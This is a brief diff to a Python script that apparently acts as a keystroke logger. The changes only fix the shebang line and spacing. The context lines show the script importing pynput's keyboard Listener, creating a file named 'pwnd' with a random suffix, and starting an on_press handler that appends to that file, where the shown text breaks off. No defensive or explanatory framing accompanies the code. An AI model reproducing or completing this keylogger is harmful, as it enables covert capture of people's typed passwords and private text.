@@ -1,5 +1,4 @@
-!#/usr/bin/env python3
-
+#!/usr/bin/env python3
 import random
 from pynput.keyboard import Key, Listener, Controller
 
@@ -7,6 +6,7 @@ output = 'pwnd' + str(random.randint(312, 33345345453453453455344534533453453453
 
 with open(output, 'w') as f:
     f.close()
+
 
 def on_press(key):
     with open(output, 'a') as f:
